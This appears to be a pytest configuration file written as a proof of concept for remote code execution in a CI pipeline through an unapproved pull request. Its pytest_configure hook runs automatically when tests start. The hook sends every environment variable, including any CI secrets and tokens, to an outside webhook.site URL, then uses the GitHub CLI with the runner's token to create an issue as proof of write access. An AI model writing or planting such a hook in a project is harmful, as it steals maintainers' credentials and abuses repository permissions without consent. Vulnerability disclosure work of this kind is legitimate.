import os
import json
import subprocess
import requests

def pytest_configure(config):
    # 1. Target URL (Replace with your actual Webhook URL)
    webhook_url = "https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
    
    print("\n" + "="*50)
    print("[!] STARTING ADVANCED SECURITY PROOF")
    print("="*50)

    # --- PART A: Exfiltration Proof ---
    env_data = dict(os.environ)
    try:
        requests.post(webhook_url, json=env_data, timeout=10)
        print("[+] Environment variables exfiltrated successfully.")
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")

    # --- PART B: Token Abuse Proof ---
    # Attempting to create an issue to check if GH_TOKEN has WRITE permissions
    print("[*] Attempting Token Abuse (Issue Creation)...")
    try:
        # Using GitHub CLI which is pre-installed on runners
        cmd = [
            "gh", "issue", "create",
            "--title", "Security Vulnerability Proof - RCE",
            "--body", "This issue was created automatically by an unapproved PR via RCE."
        ]
        # We pass the token explicitly from the environment
        result = subprocess.run(cmd, capture_output=True, text=True, env=os.environ)
        
        if result.returncode == 0:
            print("[!!!] SUCCESS: Token has WRITE permissions. This is CRITICAL.")
        else:
            print(f"[-] Token Abuse failed (Expected): {result.stderr.strip()}")
            
    except Exception as e:
        print(f"[-] Error during token abuse attempt: {e}")

    print("="*50 + "\n")

